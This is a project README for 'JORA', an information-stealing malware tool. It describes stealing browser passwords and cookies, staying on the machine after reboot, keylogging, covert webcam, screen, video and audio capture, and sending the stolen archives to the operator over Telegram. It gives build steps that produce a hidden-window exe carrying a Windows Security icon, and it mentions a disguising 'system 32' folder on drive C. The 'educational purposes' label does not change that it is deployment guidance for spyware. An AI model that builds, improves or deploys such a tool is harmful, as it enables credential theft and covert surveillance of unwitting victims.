JORA 
===
### is an interesting and multifunctional styler created for educational purposes

#### it is interesting because it remains in the system after the machine is turned off, thereby allowing you to continue taking data from both the keylogger and recording (video and audio)

JORA functionality:
---
* Taking passwords and cookies from Google Chrome and Mozilla Firefox.

* Copying the exe to the inside of the target system and creating a bat file for its further launch when the PC is turned off.

* Shooting video and recording audio files.

* Keylogger for tracking keystrokes.

* Screenshot of the desktop and webcam (if available).

* Obtaining PC characteristics.

* Sending data archives via telegram
---
## USE

You need to pull the project fromthe repository. 

Fill in the details of your telegram (TOKEN bot and your chat id) in main.py.

Install all libraries from requirements.txt , start the virtual environment and run the command

pyinstaller --onefile -w --icon=img\windows-security-new.png main.py

which is located in the "command to create file exe.txt".

The result is an exe file ready to work. Which is located in the "dist" directory

When you enter / start collect the data you need

When entering /screenshot we take the result of the keylogger, recording video and audio
---
### The work process is the following.

The directory "system 32" is created on the C drive, three new folders are already created inside it for storing data.

Next, all the necessary data is pulled out.

When you enter the "/start" command in the telegram, the extracted data is archived and sent to the user.

Simultaneously with this, the recording of the keylogger and the recording starter (video and audio) starts when you enter the "/screenshot" command, 
we get the result of their work.

After the completion of each of the commands, the data is deleted, except for video and audio, they simply overwrite the existing ones
